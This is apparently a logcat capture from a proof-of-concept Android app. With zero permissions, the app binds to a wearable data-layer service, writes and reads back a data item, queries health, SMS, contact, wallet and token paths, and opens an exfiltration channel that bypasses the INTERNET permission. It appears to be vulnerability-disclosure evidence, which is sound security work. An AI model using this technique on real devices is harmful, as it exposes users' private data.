@@ -1,0 +1,158 @@
+--------- beginning of main
+09-11 20:36:42.478 32192 32192 D DL_HIGH_IMPACT: === Data Layer HIGH IMPACT Proof v6 ===
+09-11 20:36:42.478 32192 32192 D DL_HIGH_IMPACT: UID: 10180
+09-11 20:36:42.479 32192 32192 D DL_HIGH_IMPACT: Pkg: com.poc.datalayer
+09-11 20:36:42.479 32192 32192 D DL_HIGH_IMPACT: Permissions: NONE
+09-11 20:36:42.479 32192 32192 D DL_HIGH_IMPACT: 
+09-11 20:36:42.570 32192 32192 D DL_HIGH_IMPACT: [+] Bound to WearableService broker
+09-11 20:36:42.581 32192 32212 D DL_HIGH_IMPACT: [+] Got IWearableService binder (zero permissions!)
+09-11 20:36:42.581 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.581 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.581 32192 32212 D DL_HIGH_IMPACT: PHASE 0: WRITE → READ → DELETE CYCLE
+09-11 20:36:42.581 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.584 32192 32212 D DL_HIGH_IMPACT: [+] Code 14: OK
+09-11 20:36:42.585 32192 32212 D DL_HIGH_IMPACT: [+] Local node: 6efd13d9
+09-11 20:36:42.585 32192 32212 D DL_HIGH_IMPACT: [*] Writing data item: wear://6efd13d9/poc/zero_perm_write_proof
+09-11 20:36:42.585 32192 32212 D DL_HIGH_IMPACT: [*] Data: WRITTEN_BY_ZERO_PERM_APP_1789139202582
+09-11 20:36:42.586 32192 32212 D DL_HIGH_IMPACT: [+] Code 6: OK
+09-11 20:36:42.598 32192 32204 D DL_HIGH_IMPACT: [CB:putData] code=3 size=296
+09-11 20:36:42.599 32192 32204 D DL_HIGH_IMPACT: [+] WRITE_RESULT => status=-45243 version=-1
+09-11 20:36:42.599 32192 32204 D DL_HIGH_IMPACT: [*] WRITE_RESULT: no CursorWindows (0 rows)
+09-11 20:36:42.599 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.599 32192 32212 D DL_HIGH_IMPACT: [*] Now reading back ALL data items...
+09-11 20:36:42.600 32192 32212 D DL_HIGH_IMPACT: [+] Code 8: OK
+09-11 20:36:42.606 32192 32204 D DL_HIGH_IMPACT: [+] READ_AFTER_WRITE => status=0 version=1
+09-11 20:36:42.606 32192 32204 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id
+09-11 20:36:42.607 32192 32204 D DL_HIGH_IMPACT: [+] Window[0]: 1 rows x 6 cols
+09-11 20:36:42.607 32192 32204 D DL_HIGH_IMPACT: --- Row 0 ---
+09-11 20:36:42.607 32192 32204 D DL_HIGH_IMPACT: [!!!] host = NULL
+09-11 20:36:42.607 32192 32204 D DL_HIGH_IMPACT: [!!!] path = wear://6efd13d9/poc/zero_perm_write_proof
+09-11 20:36:42.608 32192 32204 D DL_HIGH_IMPACT: [!!!] data = BLOB(38b) ascii="WRITTEN_BY_ZERO_PERM_APP_1789139202582" hex=57524954 54454e5f 42595f5a 45524f5f 5045524d 5f415050 5f313738 39313339 32303235 3832
+09-11 20:36:42.608 32192 32204 D DL_HIGH_IMPACT: [!!!] tags = NULL
+09-11 20:36:42.608 32192 32204 D DL_HIGH_IMPACT: [!!!] asset_key = NULL
+09-11 20:36:42.608 32192 32204 D DL_HIGH_IMPACT: [!!!] asset_id = NULL
+09-11 20:36:42.608 32192 32204 D DL_HIGH_IMPACT: [!!!] READ_AFTER_WRITE: EXTRACTED 1 DATA ITEMS WITH ZERO PERMISSIONS!
+09-11 20:36:42.609 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.609 32192 32212 D DL_HIGH_IMPACT: [*] Deleting test data item...
+09-11 20:36:42.611 32192 32212 D DL_HIGH_IMPACT: [+] Code 11: OK
+09-11 20:36:42.651 32192 32202 D DL_HIGH_IMPACT: [+] Delete status: 0
+09-11 20:36:42.651 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.651 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.651 32192 32212 D DL_HIGH_IMPACT: PHASE 1: READ ALL DATA ITEMS (code 8)
+09-11 20:36:42.651 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.655 32192 32202 D DL_HIGH_IMPACT: [+] ALL_ITEMS => status=0 version=1
+09-11 20:36:42.656 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id
+09-11 20:36:42.656 32192 32202 D DL_HIGH_IMPACT: [*] ALL_ITEMS: no CursorWindows (0 rows)
+09-11 20:36:42.656 32192 32212 D DL_HIGH_IMPACT: [+] Code 8: OK
+09-11 20:36:42.656 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.656 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.656 32192 32212 D DL_HIGH_IMPACT: PHASE 2: URI QUERY wear://*/ (code 9)
+09-11 20:36:42.656 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.657 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.680 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/] => status=0 version=1
+09-11 20:36:42.680 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.680 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/]: no CursorWindows (0 rows)
+09-11 20:36:42.685 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.685 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.685 32192 32212 D DL_HIGH_IMPACT: PHASE 3: HEALTH DATA QUERY
+09-11 20:36:42.685 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.689 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.693 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/health] => status=0 version=1
+09-11 20:36:42.693 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.693 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/health]: no CursorWindows (0 rows)
+09-11 20:36:42.705 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.705 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/fit] => status=0 version=1
+09-11 20:36:42.706 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.706 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/fit]: no CursorWindows (0 rows)
+09-11 20:36:42.713 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.719 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/sensor] => status=0 version=1
+09-11 20:36:42.719 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.719 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/sensor]: no CursorWindows (0 rows)
+09-11 20:36:42.733 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.743 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/heart] => status=0 version=1
+09-11 20:36:42.748 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.748 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/heart]: no CursorWindows (0 rows)
+09-11 20:36:42.755 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.757 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/step] => status=0 version=1
+09-11 20:36:42.757 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.757 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/step]: no CursorWindows (0 rows)
+09-11 20:36:42.768 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.768 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/sleep] => status=0 version=1
+09-11 20:36:42.768 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.768 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/sleep]: no CursorWindows (0 rows)
+09-11 20:36:42.772 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.774 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/workout] => status=0 version=1
+09-11 20:36:42.774 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.774 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/workout]: no CursorWindows (0 rows)
+09-11 20:36:42.774 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.774 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.774 32192 32212 D DL_HIGH_IMPACT: PHASE 4: NOTIFICATION / MESSAGES QUERY
+09-11 20:36:42.774 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.781 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.784 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/notification] => status=0 version=1
+09-11 20:36:42.784 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.784 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/notification]: no CursorWindows (0 rows)
+09-11 20:36:42.793 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/message] => status=0 version=1
+09-11 20:36:42.793 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.793 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/message]: no CursorWindows (0 rows)
+09-11 20:36:42.793 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.796 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.808 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/sms] => status=0 version=1
+09-11 20:36:42.809 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.809 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/sms]: no CursorWindows (0 rows)
+09-11 20:36:42.810 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.819 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/call] => status=0 version=1
+09-11 20:36:42.819 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.819 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/call]: no CursorWindows (0 rows)
+09-11 20:36:42.825 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.825 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/contact] => status=0 version=1
+09-11 20:36:42.825 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.825 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/contact]: no CursorWindows (0 rows)
+09-11 20:36:42.826 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.826 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.826 32192 32212 D DL_HIGH_IMPACT: PHASE 5: GOOGLE APPS DATA QUERY
+09-11 20:36:42.826 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.832 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/google] => status=0 version=1
+09-11 20:36:42.832 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.832 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/google]: no CursorWindows (0 rows)
+09-11 20:36:42.832 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.839 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.845 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/gms] => status=0 version=1
+09-11 20:36:42.845 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.845 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/gms]: no CursorWindows (0 rows)
+09-11 20:36:42.850 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.854 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/assistant] => status=0 version=1
+09-11 20:36:42.854 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.854 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/assistant]: no CursorWindows (0 rows)
+09-11 20:36:42.857 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.867 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/wallet] => status=0 version=1
+09-11 20:36:42.868 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.868 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/wallet]: no CursorWindows (0 rows)
+09-11 20:36:42.883 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.885 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/auth] => status=0 version=1
+09-11 20:36:42.885 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.885 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/auth]: no CursorWindows (0 rows)
+09-11 20:36:42.899 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.901 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/token] => status=0 version=1
+09-11 20:36:42.903 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.903 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/token]: no CursorWindows (0 rows)
+09-11 20:36:42.904 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.909 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/config] => status=0 version=1
+09-11 20:36:42.909 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.909 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/config]: no CursorWindows (0 rows)
+09-11 20:36:42.918 32192 32212 D DL_HIGH_IMPACT: [+] Code 9: OK
+09-11 20:36:42.920 32192 32202 D DL_HIGH_IMPACT: [+] URI[wear://*/common] => status=0 version=1
+09-11 20:36:42.920 32192 32202 D DL_HIGH_IMPACT: [+] Columns: [0]=host, [1]=path, [2]=data, [3]=tags, [4]=asset_key, [5]=asset_id, [6]=sourceNode
+09-11 20:36:42.920 32192 32202 D DL_HIGH_IMPACT: [*] URI[wear://*/common]: no CursorWindows (0 rows)
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: PHASE 6: CHANNEL EXFILTRATION PROOF
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: ========================================
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: A zero-perm app can open a channel to the phone,
+09-11 20:36:42.920 32192 32212 D DL_HIGH_IMPACT: bypassing INTERNET permission requirement.
+09-11 20:36:42.924 32192 32212 D DL_HIGH_IMPACT: [+] Code 31: OK
+09-11 20:36:43.007 32192 32202 D DL_HIGH_IMPACT: [+] Channel status: 0
+09-11 20:36:43.007 32192 32202 D DL_HIGH_IMPACT: [!!!] CHANNEL OPENED - zero-perm app has network path to phone!
+09-11 20:36:43.007 32192 32202 D DL_HIGH_IMPACT: [!!!] This bypasses INTERNET permission entirely.
+09-11 20:36:43.012 32192 32212 D DL_HIGH_IMPACT: 
+09-11 20:36:43.012 32192 32212 D DL_HIGH_IMPACT: === HIGH IMPACT PROOF COMPLETE ===
